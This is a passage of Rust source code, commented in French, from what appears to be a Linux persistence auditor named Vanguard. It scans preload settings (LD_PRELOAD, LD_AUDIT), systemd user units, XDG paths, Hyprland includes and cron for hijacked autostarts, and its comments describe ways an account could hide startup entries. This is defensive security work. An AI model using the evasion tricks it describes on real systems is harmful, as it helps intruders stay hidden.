fn prechargement_selon(ligne: &str, sorte: Variables) -> bool {
    match sorte {
        Variables::Cles | Variables::Systemd => !commentaire_de_systemd(ligne) && nomme_prechargement(ligne),
        Variables::Shell => !commentaire_du_shell(ligne) && nomme_prechargement(ligne) && !unset_seul(ligne),
        Variables::Hypr => definit_prechargement(ligne),
    }
}

/// Ligne qui nomme LD_PRELOAD ou LD_AUDIT, sans juger si c'est un commentaire.
fn nomme_prechargement(ligne: &str) -> bool {
    ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd, ou de tous ceux de ~/.config/hypr), liens vers
/// un fichier compris ; les liens d'activation (dossiers « *.wants ») ne sont pas parcourus. Un dossier « *.d » qui est
/// un lien vers un dossier se suit, comme systemd le suit (relecture adverse, C4 ; `liens_d_ajouts` le signale).
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    fichiers_et_liens(dossier, extensions, &mut Vec::new())
}

/// `fichiers_de`, et dans `liens` les dossiers « *.d » suivis qui sont des liens vers un dossier : un tel lien posé
/// par le compte est déjà un indice (relecture adverse, C4).
fn fichiers_et_liens(
    dossier: &Path,
    extensions: &[&str],
    liens: &mut Vec<std::path::PathBuf>,
) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    let mut parcours = Parcours::default();
    fichiers_sous(
        dossier,
        extensions,
        dossier.ends_with("hypr"),
        0,
        &mut trouve,
        &mut parcours,
    );
    liens.append(&mut parcours.liens);
    trouve
}

/// Les fichiers d'un dossier de modules de Hyprland (~/.config/hypr, ou un dossier de modules d'Omarchy), à toute
/// profondeur, et dans `parcours` ce qui s'y lit mal : un sous-dossier qui est un lien vers un dossier (suivi), un
/// dossier trop profond (non lu). Lua y prend un module par son nom (« require("a.b") »), lien suivi ; Vanguard le
/// lit aussi, et dit les deux (deuxième vérification, N10).
fn fichiers_de_hypr(dossier: &Path, parcours: &mut Parcours) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    fichiers_sous(dossier, &["conf", "lua"], true, 0, &mut trouve, parcours);
    trouve
}

/// Au plus autant de dossiers parcourus l'un dans l'autre par `fichiers_de`.
const PROFONDEUR_MAX: u32 = 8;

/// Ce que le parcours d'un dossier trouve à dire en plus de ses fichiers.
#[derive(Default)]
struct Parcours {
    /// Les dossiers « *.d » suivis qui sont des liens vers un dossier (relecture adverse, C4).
    liens: Vec<std::path::PathBuf>,
    /// Les sous-dossiers d'un dossier de Hyprland qui sont des liens vers un dossier : suivis, et dits.
    liens_hypr: Vec<std::path::PathBuf>,
    /// Les dossiers non parcourus, au-delà de `PROFONDEUR_MAX` niveaux : ce qu'ils lancent n'est pas vérifié.
    trop_profonds: Vec<std::path::PathBuf>,
}

/// Le nom du fichier finit par « `.<ext>` », même réduit à lui (vérification 3, H1) : le `find -name '*.lua'` de
/// require_all d'Omarchy prend un fichier nommé « .lua » (`require("")` le charge), alors que `Path::extension()`
/// ne voit aucune extension à un nom qui commence par son seul point.
fn a_l_extension(f: &Path, ext: &str) -> bool {
    let suffixe = format!(".{ext}");
    f.file_name()
        .is_some_and(|n| n.as_encoded_bytes().ends_with(suffixe.as_bytes()))
}

fn fichiers_sous(
    dossier: &Path,
    extensions: &[&str],
    hypr: bool,
    profondeur: u32,
    trouve: &mut Vec<std::path::PathBuf>,
    parcours: &mut Parcours,
) {
    if profondeur > PROFONDEUR_MAX {
        parcours.trop_profonds.push(dossier.to_path_buf());
        return;
    }
    // Dans l'ordre des noms, pas dans celui que rend le système de fichiers (l'ordre de création sur btrfs, celui
    // d'un hachage sur ext4) : le premier refus d'une alerte l'emporte (`Temoins::de`), et le verdict d'une même
    // maison changeait selon le disque où elle était (vérification 4, D1).
    let mut entrees: Vec<std::fs::DirEntry> = std::fs::read_dir(dossier).into_iter().flatten().flatten().collect();
    entrees.sort_by_key(std::fs::DirEntry::file_name);
    for e in entrees {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
        // une autre sortirait de la lecture (et son alerte avec). Un lien vers un dossier, seulement « *.d » (ou
        // sous Hyprland, où Lua le suit) et à profondeur bornée (une boucle s'arrête là, dite).
        let cible = || std::fs::metadata(&p).ok();
        let fichier = t.is_file() || (t.is_symlink() && cible().is_some_and(|m| m.is_file()));
        let ajouts = a_l_extension(&p, "d");
        let sous_dossier = t.is_dir() || ((ajouts || hypr) && t.is_symlink() && cible().is_some_and(|m| m.is_dir()));
        if sous_dossier && (ajouts || hypr) {
            if t.is_symlink() {
                if hypr {
                    parcours.liens_hypr.push(p.clone());
                } else {
                    parcours.liens.push(p.clone());
                }
            }
            fichiers_sous(&p, extensions, hypr, profondeur.saturating_add(1), trouve, parcours);
        } else if fichier && extensions.iter().any(|e| a_l_extension(&p, e)) {
            trouve.push(p);
        }
    }
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// Le releveur de `persistance_dans` : la racine lue, le dossier personnel `maison` et les dossiers que les variables
/// de la session (`variable`) y ajoutent, comme systemd et les sessions les lisent.
fn releveur(racine: &Path, maison: &Path, variable: &impl Fn(&str) -> Option<std::ffi::OsString>) -> Releveur {
    // Une variable XDG relative est ignorée par systemd (la spécification XDG) : seule une absolue, ailleurs que le
    // dossier par défaut, ajoute un dossier.
    let deplace = |nom: &str, defaut: &str| {
        variable(nom)
            .map(std::path::PathBuf::from)
            .filter(|p| p.is_absolute() && *p != maison.join(defaut))
    };
    let runtime = variable("XDG_RUNTIME_DIR")
        .map(std::path::PathBuf::from)
        .filter(|p| p.is_absolute());
    let de_systemd = uid_du_compte().map(|uid| std::path::PathBuf::from(format!("/run/user/{uid}")));
    let session = runtime.clone().or_else(|| de_systemd.clone());
    // XDG_RUNTIME_DIR ailleurs que le dossier que systemd donne au compte : un programme du compte peut changer la
    // variable d'où Vanguard est lancé, le gestionnaire de la session lit toujours /run/user/<uid> (relecture
    // adverse, B6). Les deux se lisent.
    let session_de_systemd = de_systemd.filter(|d| Some(d) != session.as_ref());
    let liste = |nom: &str| -> Vec<std::path::PathBuf> {
        variable(nom)
            .map(|v| std::env::split_paths(&v).filter(|p| p.is_absolute()).collect())
            .unwrap_or_default()
    };
    let mut r = Releveur {
        racine: racine.to_path_buf(),
        maison: maison.to_path_buf(),
        runtime,
        session,
        config: deplace("XDG_CONFIG_HOME", ".config"),
        donnees: deplace("XDG_DATA_HOME", ".local/share"),
        zdot: deplace("ZDOTDIR", ""),
        etat: deplace("XDG_STATE_HOME", ".local/state"),
        modules: Vec::new(),
        hypr_inclus: Vec::new(),
        dossiers_ajoutes: Vec::new(),
        session_de_systemd,
        donnees_systeme: liste("XDG_DATA_DIRS"),
        config_systeme: liste("XDG_CONFIG_DIRS"),
        uwsm_session: VARIABLES_D_UWSM
            .iter()
            .filter_map(|nom| variable(nom))
            .flat_map(|v| std::env::split_paths(&v).collect::<Vec<_>>())
            .filter(|p| !p.as_os_str().is_empty())
            .map(|p| depuis_la_maison(maison, &p))
            .collect(),
        environnement: None,
        budget: temoins::Budget::default(),
        dbus: std::cell::OnceCell::new(),
        ..Releveur::default()
    };
    (r.gestionnaire, r.gestionnaire_non_resolu) = dossiers_du_gestionnaire(&r);
    r
}

/// Les dossiers où systemd cherche les unités du compte (systemd --user), du plus prioritaire au moins prioritaire,
/// pour ce dossier personnel et ces variables de session : la liste même du bilan des persistances
/// (`dossiers_d_unites`), pour que `vanguard demarrage` sache quelle unité tourne vraiment (relecture 0.94, C-1).
/// `Err` : pourquoi la liste ne se fait pas (dossier de la session inconnu).
pub(crate) fn dossiers_d_unites_du_compte(
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    dossiers_d_unites(&releveur(Path::new("/"), maison, &variable), true)
}

/// Les noms des dossiers de compléments (« nom.service.d ») qui s'appliquent à l'unité `nom` (`ajouts_de`).
pub(crate) fn complements_d_unite(nom: &str) -> Vec<String> {
    ajouts_de(nom)
}

/// Les noms sous lesquels systemd connaît l'unité `nom` dans `dossiers` (`noms_de_l_unite`) : ses compléments
/// s'appliquent sous chacun. `None` : rien n'est conclu.
pub(crate) fn noms_d_unite(dossiers: &[std::path::PathBuf], nom: &str) -> Option<Vec<String>> {
    noms_de_l_unite(dossiers, nom)
}

/// Ce qu'un complément du compte (« nom.service.d/x.conf », de texte `texte`) posé sur une unité du système change à
/// ce qu'elle lance, pour `vanguard demarrage` (relecture 0.94, D) : la clé de chaque ligne que le juge du bilan
/// refuse (`permise::directive`, avec les codes « % » du compte de `maison`), ou qui lance, démarre ou change ce qui
/// se lance (Exec…, dépendances qui démarrent, variables, dossier courant). Vide : rien de tel, le complément se tait.
/// Une ligne sans « = » ou hors de toute section compte (« ? » ou sa clé) : jamais un silence par défaut.
pub(crate) fn complement_change_le_lancement(texte: &str, maison: &Path) -> Vec<String> {
    const LANCEMENT: [&str; 5] = [
        "Environment",
        "EnvironmentFile",
        "PassEnvironment",
        "UnsetEnvironment",
        "WorkingDirectory",
    ];
    let lue = maison.to_string_lossy().into_owned();
    let maisons = [lue.as_str()];
    let s = permise::Systeme {
        racine: Path::new("/"),
        maison: &lue,
        maisons: &maisons,
        courant: None,
        noms_des_lieux: std::cell::OnceCell::new(),
        relatif: std::cell::OnceCell::new(),
    };
    let codes = Codes {
        utilisateur: true,
        maison: lue.clone(),
        session: None,
        variables: std::collections::BTreeMap::new(),
        courant: None,
        sauvegarde: None,
        sauvegarde_completee: false,
        sauvegarde_environnement: false,
    };
    let mut cles: Vec<String> = Vec::new();
    let mut section: Option<String> = None;
    for logique in lignes_de_systemd(texte) {
        if let Some(nom) = logique.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            section = Some(nom.to_string());
            continue;
        }
        if section.as_deref().is_some_and(|x| x.starts_with("X-")) {
            continue;
        }
        let cle = logique
            .texte
            .split_once('=')
            .map_or("?", |(c, _)| c.trim_matches([' ', '\t']));
        let change = permise::directive(&s, &codes, section.as_deref(), &logique.texte).is_err()
            || cle.starts_with("Exec")
            || permise::DEMARRENT.contains(&cle)
            || LANCEMENT.contains(&cle);
        if change && !cles.iter().any(|c| c == cle) {
            cles.push(cle.to_string());
        }
    }
    cles
}

/// Les valeurs « ExecStart= » de la section `[Service]` que systemd retient pour une unité, lue comme il la lit
/// (`lignes_de_systemd`) : celles du fichier de l'unité puis de chacun de ses compléments, `textes` dans l'ordre où
/// systemd les applique ; une valeur vide efface les précédentes (systemd.service(5)). Pour `vanguard demarrage` : la
/// commande montrée est celle qui tourne, pas seulement celle du fichier (relecture 0.94, D-4).
pub(crate) fn exec_start_effectif<'a>(textes: impl IntoIterator<Item = &'a str>) -> Vec<String> {
    let mut valeurs = Vec::new();
    for texte in textes {
        let mut service = false;
        for logique in lignes_de_systemd(texte) {
            if let Some(nom) = logique.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
                service = nom == "Service";
                continue;
            }
            let Some((cle, valeur)) = logique.texte.split_once('=') else {
                continue;
            };
            if !service || cle.trim_matches([' ', '\t']) != "ExecStart" {
                continue;
            }
            let valeur = valeur.trim_matches([' ', '\t']);
            if valeur.is_empty() {
                valeurs.clear();
            } else {
                valeurs.push(valeur.to_string());
            }
        }
    }
    valeurs
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    // Une racine relative (« » au lieu de « / ») ferait lire ld.so.preload, profile.d, cron.d… sous le dossier
    // courant : rien n'y serait, et le verdict serait « sain » (campagne n° 4, M6).
    debug_assert!(
        racine.is_absolute(),
        "racine de la persistance relative : {}",
        racine.display()
    );
    #[cfg(test)]
    tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
    let mut t = Lancements {
        r: releveur(racine, maison, &variable),
        ..Lancements::default()
    };
    t.r.dossiers_ajoutes = dossiers_ajoutes(&t.r);
    // V-1 (relecture 0.95) : un fichier du gestionnaire de systemd du compte déplace ses dossiers d'unités sous une
    // forme que Vanguard ne résout pas : ce qu'il y range n'est pas relevé, c'est dit.
    for (f, nom) in t.r.gestionnaire_non_resolu.clone() {
        let ou = crate::ui::affichable(&t.r.montre(&f));
        let source = format!("gestionnaire {ou} {nom}");
        let (suspect, refus) = if nom == "?" {
            (
                trf!(
                    "{ou} ne se lit pas en entier : les dossiers d'unités qu'il peut ajouter au gestionnaire de systemd du compte ne sont pas relevés (non vérifié)",
                    "{ou} cannot be read in full: the unit folders it can add to the account's systemd manager are not checked (not verified)"
                ),
                trf!(
                    "{ou} ne se lit pas en entier : l'alerte ne se déclare pas normale tant qu'il ne se lit pas",
                    "{ou} cannot be read in full: the alert cannot be declared normal while it cannot be read"
                ),
            )
        } else if VARIABLES_QUI_DEPLACENT.contains(&nom.as_str()) {
            // W-1 : HOME ou XDG_RUNTIME_DIR posés au gestionnaire déplacent tous ses dossiers d'unités.
            (
                trf!(
                    "{ou} pose {nom} au gestionnaire de systemd du compte : il cherche alors ses unités et leurs compléments ailleurs, là où Vanguard ne les relève pas (non vérifié)",
                    "{ou} sets {nom} for the account's systemd manager: it then looks for its units and their drop-ins elsewhere, where Vanguard does not check them (not verified)"
                ),
                trf!(
                    "{ou} pose {nom} au gestionnaire : l'alerte ne se déclare pas normale tant que cette ligne y est ; pour la lever, retirez {nom} de {ou} (un fichier du système se change avec les droits d'administrateur), puis relancez la session",
                    "{ou} sets {nom} for the manager: the alert cannot be declared normal while this line is there; to clear it, remove {nom} from {ou} (a system file is changed with admin rights), then restart the session"
                ),
            )
        } else {
            (
                trf!(
                    "{ou} pose {nom} au gestionnaire de systemd du compte sous une forme que Vanguard ne résout pas : les dossiers d'unités qu'elle ajoute ne sont pas relevés (non vérifié)",
                    "{ou} sets {nom} for the account's systemd manager in a form Vanguard does not resolve: the unit folders it adds are not checked (not verified)"
                ),
                trf!(
                    "{ou} : {nom} ne se résout pas en dossiers ; l'alerte ne se déclare pas normale tant que la valeur n'est pas une liste de chemins absolus (ou « $HOME/… »)",
                    "{ou}: {nom} does not resolve to folders; the alert cannot be declared normal until the value is a list of absolute paths (or “$HOME/…”)"
                ),
            )
        };
        constat_sans_ligne(&mut t, &source, suspect, refus);
    }
    if let (Some(autre), Some(variable)) = (t.r.session_de_systemd.clone(), t.r.runtime.clone())
        && std::fs::symlink_metadata(t.r.sous(&autre)).is_ok()
    {
        let (v, a) = (
            crate::ui::affichable(&t.r.montre(&variable)),
            crate::ui::affichable(&t.r.montre(&autre)),
        );
        let source = format!("session {}", t.r.montre(&variable));
        constat_sans_ligne(
            &mut t,
            &source,
            trf!(
                "XDG_RUNTIME_DIR mène à {v}, pas au dossier de session que systemd donne au compte ({a}) : les deux sont lus ; une session qui change cette variable cache ce qu'elle range",
                "XDG_RUNTIME_DIR leads to {v}, not to the session folder systemd gives the account ({a}): both are read; a session that changes this variable hides what it stores"
            ),
            trf!(
                "XDG_RUNTIME_DIR ({v}) n'est pas le dossier de session de systemd ({a}) : l'alerte ne se déclare pas normale tant qu'ils diffèrent",
                "XDG_RUNTIME_DIR ({v}) is not systemd's session folder ({a}): the alert cannot be declared normal while they differ"
            ),
        );
    }
    // Un dossier personnel inconnu ou relatif : les fichiers du compte se liraient sous le dossier courant, et
    // l'absence de tout y passerait pour « rien de suspect » (campagne E, M-f). C'est dit, non vérifié.
    if !maison.is_absolute() {
        t.sources.push(source_de("maison", "relatif"));
        t.retraits.push(None);
        t.temoins.push(Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        )));
        t.suspects.push(
            tr!(
                "dossier personnel inconnu ou relatif : les démarrages du compte ne sont pas vérifiés",
                "home folder unknown or relative: the account's startup files are not checked"
            )
            .to_string(),
        );
    }
    // Un dossier personnel absent ou qu'on ne peut pas lire, ou un des dossiers où le compte range ses démarrages :
    // rien n'y serait trouvé, et ce ne serait pas « rien de suspect » (vérifications de la campagne E, N9). Un
    // sous-dossier absent, lui, ne lance rien.
    if maison.is_absolute() {
        for (rang, dossier) in [
            "",
            ".config",
            ".config/systemd",
            ".config/systemd/user",
            ".config/autostart",
            ".config/hypr",
            ".local/share/systemd/user",
        ]
        .into_iter()
        .enumerate()
        {
            let chemin = maison.join(dossier);
            let Err(e) = std::fs::read_dir(&chemin) else {
                continue;
            };
            if rang > 0 && e.kind() == std::io::ErrorKind::NotFound {
                continue;
            }
            let montre = if rang == 0 {
                tr!("le dossier personnel", "the home folder").to_string()
            } else {
                crate::ui::affichable(&t.r.montre(&chemin))
            };
            t.sources
                .push(source_de("maison", &format!("illisible {}", t.r.montre(&chemin))));
            t.retraits.push(None);
            t.temoins.push(Err(temoins::Refus(trf!(
                "{montre} ne se lit pas : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read: the account's startup files are not checked"
            ))));
            t.suspects.push(trf!(
                "{montre} ne se lit pas ({e}) : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read ({e}): the account's startup files are not checked"
            ));
            if rang == 0 {
                break;
            }
        }
    }
    // Les dossiers de la session où systemd range des unités : illisibles, ce qu'ils lancent n'est pas vérifié.
    for session in
        t.r.session
            .iter()
            .chain(&t.r.session_de_systemd)
            .cloned()
            .collect::<Vec<_>>()
    {
        for d in std::iter::once("systemd").chain(DOSSIERS_DE_LA_SESSION) {
            let chemin = t.r.sous(&session.join(d));
            let Err(e) = std::fs::read_dir(&chemin) else {
                continue;
            };
            if e.kind() == std::io::ErrorKind::NotFound {
                continue;
            }
            dossier_illisible(&mut t, &chemin, &e);
        }
    }
    let Demarrage {
        fichiers: mut demarrage,
        mut hypr,
        liens,
        parcours,
        mut modules,
        masques,
    } = fichiers_de_demarrage(&t.r);
    // Une copie conforme de la bibliothèque d'Omarchy fait ce que fait l'original du paquet : dite, pas jugée.
    let copies: Vec<(std::path::PathBuf, std::path::PathBuf)> = hypr
        .iter()
        .filter_map(|f| copie_d_omarchy(&t.r, f).map(|o| (f.clone(), o)))
        .collect();
    for liste in [&mut demarrage, &mut hypr, &mut modules] {
        liste.retain(|f| !copies.iter().any(|(c, _)| c == f));
    }
    t.r.modules = modules;
    juger_parcours(&mut t, &parcours, &masques, &copies);
    for lien in liens.into_iter().filter(|l| !de_root_seul(l)) {
        let montre = crate::ui::affichable(&t.r.montre(&lien));
        // La cible telle qu'elle se montre : « ~/… » dans le dossier personnel, comme les fichiers lus.
        let vers = std::fs::read_link(&lien).map_or_else(
            |_| "?".to_string(),
            |c| {
                let c = if c.is_absolute() {
                    t.r.montre(&t.r.sous(&c))
                } else {
                    c.to_string_lossy().into_owned()
                };
                crate::ui::affichable(&c)
            },
        );
        let source = format!("lien {}", t.r.montre(&lien));
        constat_sans_ligne(
            &mut t,
            &source,
            trf!(
                "{montre} est un lien vers {vers} : systemd y lit des ajouts d'unité, lus et jugés ici aussi",
                "{montre} is a link to {vers}: systemd reads unit additions there, read and judged here too"
            ),
            trf!(
                "{montre} : un dossier d'ajouts d'unité qui est un lien ne peut pas être déclaré normal : remplacez-le par un dossier",
                "{montre}: a unit addition folder that is a link cannot be declared normal: replace it with a folder"
            ),
        );
    }
    let (sortes, illisibles) = fichiers_de_configuration(&t.r);
    // S-3 (re-contrôle 2 0.95) : un dossier où uwsm cherche ses fichiers de variables (XDG_CONFIG_DIRS, XDG_DATA_DIRS)
    // qui ne se lit pas : ce qu'il y poserait n'est pas jugé, c'est dit (non vérifié), jamais compté comme sain.
    for d in illisibles {
        let ou = crate::ui::affichable(&t.r.montre(&d));
        let source = format!("uwsm illisible {}", t.r.montre(&d));
        constat_sans_ligne(
            &mut t,
            &source,
            trf!(
                "{ou} ne se lit pas : les fichiers de variables qu'uwsm y lirait ne sont pas jugés (non vérifié)",
                "{ou} cannot be read: the variable files uwsm would read there are not checked (not verified)"
            ),
            trf!(
                "{ou} ne se lit pas : l'alerte ne se déclare pas normale tant qu'il ne se lit pas",
                "{ou} cannot be read: the alert cannot be declared normal while it cannot be read"
            ),
        );
    }
    let mut configuration: Vec<std::path::PathBuf> = sortes.iter().map(|(f, _)| f.clone()).collect();
    let sortes_lues = sortes.clone();
    let (environnement, hypr_lus, hypr_non_suivies, shell_inclus) = environnement(&t.r, sortes, hypr.clone());
    t.r.environnement = Some(environnement);
    // Un « source = » de Hyprland que Vanguard ne suit pas (chemin calculé, joker de dossier, borne), ou qui lit un
    // dossier temporaire ou caché : dit, jamais tu (relecture adverse, C7 ; deuxième vérification, N2, N3).
    for (ou, ligne, pourquoi) in hypr_non_suivies {
        let vue = crate::ui::couper(&crate::ui::affichable(&ligne), 90);
        let source = match pourquoi {
            NonSuivi::Borne(_) => "source borne".to_string(),
            _ => format!("source {} {ligne}", ou.rsplit_once(':').map_or(ou.as_str(), |(m, _)| m)),
        };
        let ou = crate::ui::affichable(&ou);
        let (suspect, refus) = match pourquoi {
            NonSuivi::Calcule => (
                trf!(
                    "{ou} : « {vue} » inclut un fichier de Hyprland dont le chemin se calcule : ce qu'il lance n'est pas vérifié",
                    "{ou}: “{vue}” includes a Hyprland file whose path is computed: what it starts is not checked"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland au chemin calculé ne peut pas être déclarée normale : écrivez le chemin en toutes lettres",
                    "{ou}: a Hyprland inclusion with a computed path cannot be declared normal: write the path out in full"
                ),
            ),
            NonSuivi::Joker => (
                trf!(
                    "{ou} : « {vue} » inclut des fichiers de Hyprland par un joker dans le dossier : non suivis, ce qu'ils lancent n'est pas vérifié",
                    "{ou}: “{vue}” includes Hyprland files through a wildcard in the folder: not followed, what they start is not checked"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland avec un joker dans le dossier ne peut pas être déclarée normale : écrivez le dossier en toutes lettres",
                    "{ou}: a Hyprland inclusion with a wildcard in the folder cannot be declared normal: write the folder out in full"
                ),
            ),
            NonSuivi::Temporaire => (
                trf!(
                    "{ou} : « {vue} » inclut un fichier de Hyprland rangé dans un dossier temporaire (lu et jugé aussi)",
                    "{ou}: “{vue}” includes a Hyprland file stored in a temporary folder (read and judged too)"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland depuis un dossier temporaire ne peut pas être déclarée normale : déplacez le fichier",
                    "{ou}: a Hyprland inclusion from a temporary folder cannot be declared normal: move the file"
                ),
            ),
            NonSuivi::Borne(coupes) => (
                trf!(
                    "Hyprland inclut plus de {SOURCES_MAX} fichiers par « source » : {coupes} fichier(s) de Hyprland, à partir de {ou}, ne sont pas lus ; ce qu'ils lancent n'est pas vérifié",
                    "Hyprland includes more than {SOURCES_MAX} files through “source”: {coupes} Hyprland file(s), from {ou} on, are not read; what they start is not checked"
                ),
                trf!(
                    "trop d'inclusions de Hyprland pour les lire toutes ({coupes} non lue(s)) : l'alerte ne peut pas être déclarée normale",
                    "too many Hyprland inclusions to read them all ({coupes} not read): the alert cannot be declared normal"
                ),
            ),
        };
        constat_sans_ligne(&mut t, &source, suspect, refus);
    }
    // Un fichier que Hyprland lit par « source = » hors de ses dossiers lance aussi des programmes : ses lignes se
    // jugent (troisième vérification de la campagne E : ses « env = » étaient lus, pas ses « exec-once »).
    let inclus: Vec<std::path::PathBuf> = hypr_lus.into_iter().filter(|f| !hypr.contains(f)).collect();
    demarrage.extend(inclus.iter().cloned());
    hypr.extend(inclus.iter().cloned());
    t.r.hypr_inclus = inclus;
    lire_prechargement(racine, &variable, gestion, &mut t);
    // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
    configuration.extend(hypr);
    // R-6 : puis ceux qu'un profil ou un fichier d'uwsm lit par « . » ou « source », chacun selon sa sorte.
    let mut sortes_lues = sortes_lues;
    for (f, sorte) in shell_inclus {
        if !configuration.contains(&f) {
            configuration.push(f.clone());
            sortes_lues.push((f, sorte));
        }
    }
    juger_configuration(&configuration, &sortes_lues, &demarrage, maison, &mut t);
    juger_demarrage(&demarrage, maison, &mut t);
    juger_generateurs(&mut t);
    juger_cron(racine, crontab, &mut t);
    juger_popt(&mut t);
    let services = services_ajoutes(racine, gestion, &mut t.r);
    let mut constats = vec![constat_des_lancements(t)];
    constats.extend(constat_des_copies(&copies, maison));
    constats.extend(services);
    constats
}

/// Le dossier de la bibliothèque d'Omarchy, posé par son paquet.
const OMARCHY: &str = "/usr/share/omarchy";

/// L'original de la bibliothèque d'Omarchy dont `f` est la copie conforme : même chemin relatif (sous
/// ~/.config/hypr : tel quel, sous config/hypr ou sous default/hypr ; sous ~/.config ou ~/.local/state : tel quel),
/// même contenu entier (SHA-256), l'original à root seul. Une telle copie fait ce que fait l'original, que Vanguard
/// ne lit pas (il vient du paquet) : ses lignes ne se comptent pas, la copie se dit (deuxième vérification, les
/// 62 lignes « non lue » de la bibliothèque recopiée).
fn copie_d_omarchy(r: &Releveur, f: &Path) -> Option<std::path::PathBuf> {
    copie_d_omarchy_selon(r, f, &de_root_seul)
}

/// `copie_d_omarchy`, le jugement « à root seul » passé en paramètre (vérification 3, H5) : l'essai le remplace,
/// pour tourner aussi sous `unshare -r`, où rien n'est cru à root.
fn copie_d_omarchy_selon(r: &Releveur, f: &Path, root_seul: &dyn Fn(&Path) -> bool) -> Option<std::path::PathBuf> {
    let omarchy = r.sous(Path::new(OMARCHY));
    let mut candidats = Vec::new();
    let dossiers_hypr = [
        Some(r.maison.join(".config/hypr")),
        r.config.as_ref().map(|c| r.sous(&c.join("hypr"))),
    ];
    for d in dossiers_hypr.into_iter().flatten() {
        if let Ok(rel) = f.strip_prefix(&d) {
            candidats.push(omarchy.join(rel));
            candidats.push(omarchy.join("config/hypr").join(rel));
            candidats.push(omarchy.join("default/hypr").join(rel));
        }
    }
    for base in [".config", ".local/state"] {
        if let Ok(rel) = f.strip_prefix(r.maison.join(base)) {
            candidats.push(omarchy.join(rel));
        }
    }
    let lu = temoins::lire_borne(f, LECTURE_MAX).ok().filter(|l| l.entier)?;
    let empreinte = temoins::sha256_de(&lu.octets);
    candidats.into_iter().find(|o| {
        root_seul(o)
            && temoins::lire_borne(o, LECTURE_MAX).is_ok_and(|l| l.entier && temoins::sha256_de(&l.octets) == empreinte)
    })
}

/// Les copies conformes de la bibliothèque d'Omarchy (`copie_d_omarchy`), dites en information : une ligne par
/// fichier, sans alerte.
fn constat_des_copies(copies: &[(std::path::PathBuf, std::path::PathBuf)], maison: &Path) -> Option<Constat> {
    if copies.is_empty() {
        return None;
    }
    let liste: Vec<String> = copies
        .iter()
        .map(|(c, o)| {
            let o = o.to_string_lossy();
            let o = o.find(OMARCHY).map_or(o.as_ref(), |i| o.get(i..).unwrap_or_default());
            format!("{} = {}", court(c, maison), crate::ui::affichable(o))
        })
        .collect();
    Some(ok(
        "Persistance",
        trf!(
            "{} fichier(s) de Hyprland sont des copies conformes de la bibliothèque d'Omarchy (contenu identique à l'original du paquet, à root) : ils font ce qu'elle fait, leurs lignes ne sont pas comptées : {}.",
            "{} Hyprland file(s) are exact copies of Omarchy's library (same content as the package original, owned by root): they do what it does, their lines are not counted: {}.",
            liste.len(),
            liste.join(" ; ")
        ),
    ))
}

/// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (deuxième vérification, N10, N11) : un
/// sous-dossier qui est un lien (suivi, ses modules jugés), un dossier trop profond (non lu), un module qui en masque
/// un autre (jugé aussi). Chacun levé, jamais déclarable ; une copie conforme d'Omarchy ne masque rien qui change.
fn juger_parcours(
    t: &mut Lancements,
    parcours: &Parcours,
    masques: &[std::path::PathBuf],
    copies: &[(std::path::PathBuf, std::path::PathBuf)],
) {
    for lien in &parcours.liens_hypr {
        let montre = crate::ui::affichable(&t.r.montre(lien));
        let vers = std::fs::read_link(lien).map_or_else(
            |_| "?".to_string(),
            |c| crate::ui::affichable(&t.r.montre(&t.r.sous(&c))),
        );
        constat_sans_ligne(
            t,
            &format!("lien hypr {}", t.r.montre(lien)),
            trf!(
                "{montre} est un lien vers {vers} : Hyprland y prend des modules Lua, lus et jugés ici aussi",
                "{montre} is a link to {vers}: Hyprland takes Lua modules there, read and judged here too"
            ),
            trf!(
                "{montre} : un dossier de modules de Hyprland qui est un lien ne peut pas être déclaré normal : remplacez-le par un dossier",
                "{montre}: a Hyprland module folder that is a link cannot be declared normal: replace it with a folder"
            ),
        );
    }
    for dossier in &parcours.trop_profonds {
        let montre = crate::ui::affichable(&t.r.montre(dossier));
        constat_sans_ligne(
            t,
            &format!("profond {}", t.r.montre(dossier)),
            trf!(
